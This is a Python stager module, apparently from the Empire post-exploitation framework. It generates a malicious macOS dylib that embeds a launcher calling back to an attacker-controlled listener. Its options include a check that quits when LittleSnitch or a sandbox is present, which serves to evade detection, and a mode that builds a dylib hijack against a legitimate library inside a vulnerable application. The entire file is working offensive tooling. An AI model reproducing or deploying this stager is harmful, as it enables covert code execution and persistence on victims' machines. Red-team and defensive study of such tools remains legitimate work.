from lib.common import helpers
import os

class Stager:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'dylib',

            'Author': ['@xorrior'],

            'Description': ('Generates a dylib.'),

            'Comments': [
                ''
            ]
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener' : {
                'Description'   :   'Listener to generate stager for.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Language' : {
                'Description'   :   'Language of the stager to generate.',
                'Required'      :   True,
                'Value'         :   'python'
            },
            'Architecture' : {
                'Description'   :   'Architecture: x86/x64',
                'Required'      :   True,
                'Value'         :   'x86'
            },
            'SafeChecks' : {
                'Description'   :   'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
                'Required'      :   True,
                'Value'         :   'True'
            },
            'Hijacker' : {
                'Description'   :   'Generate dylib to be used in a Dylib Hijack',
                'Required'      :   True,
                'Value'         :   'False'
            },
            'RPath' : {
                'Description'   :   'Full path of the legitimate dylib as it would be on a target system.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'LocalLegitDylib' : {
                'Description'   :   'Local path to the legitimate dylib used in the vulnerable application. Required if Hijacker is set to True.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'OutFile' : {
                'Description'   :   'File to write the dylib.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def generate(self):
        # extract all of our options
        language = self.options['Language']['Value']
        listenerName = self.options['Listener']['Value']
        userAgent = self.options['UserAgent']['Value']
        arch = self.options['Architecture']['Value']
        hijacker = self.options['Hijacker']['Value']
        safeChecks = self.options['SafeChecks']['Value']
        legitDylib = self.options['LocalLegitDylib']['Value']
        rpath = self.options['RPath']['Value']

        if arch == "":
            print helpers.color("[!] Please select a valid architecture")
            return ""

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, userAgent=userAgent,  safeChecks=safeChecks)

        if launcher == "":
            print helpers.color("[!] Error in launcher command generation.")
            return ""

        else:
            launcher = launcher.strip('echo').strip(' | python &').strip("\"")
            dylib = self.mainMenu.stagers.generate_dylib(launcherCode=launcher, arch=arch, hijacker=hijacker)
            if hijacker.lower() == 'true' and os.path.exists(legitDylib):
                f = open('/tmp/tmp.dylib', 'wb')
                f.write(dylib)
                f.close()

                dylib = self.mainMenu.stagers.generate_dylibHijacker(attackerDylib="/tmp/tmp.dylib", targetDylib=legitDylib, LegitDylibLocation=rpath)
                os.remove('/tmp/tmp.dylib')

            return dylib
